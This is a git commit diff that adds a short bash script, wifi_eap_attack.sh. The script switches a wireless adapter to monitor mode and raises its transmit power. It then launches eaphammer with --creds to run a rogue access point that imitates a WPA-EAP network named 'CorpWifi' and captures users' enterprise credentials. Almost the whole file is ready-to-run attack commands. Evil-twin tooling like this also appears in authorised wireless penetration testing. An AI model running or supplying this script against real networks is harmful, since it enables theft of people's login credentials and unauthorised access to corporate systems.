88db4e8dd60ed56cad293f1cb490ca9fdbe4f3c4
sirchsec <85844648+sirchsec@users.noreply.github.com>
2021-10-12 10:33:39 -0400

    Update wifi_eap_attack.sh

--- wifi_eap_attack.sh
+++ wifi_eap_attack.sh
@@ -1,1 +1,22 @@
-#
+#!/bin/bash
+
+interface=wlan0
+echo "Interface is set to $interface"
+sleep 3
+
+if [ `id -u` -eq 0 ]
+then
+        echo "Running as sudo user :)"
+else
+        echo "Please run with sudo!"
+        exit 1
+fi
+
+echo "Configuring wifi adapter"
+sudo ip link set $interface down
+sudo iw $interface set txpower fixed 3000
+sudo iw dev $interface set type monitor
+sudo ip link set $interface up
+
+cd /opt/eaphammer
+/opt/eaphammer/eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
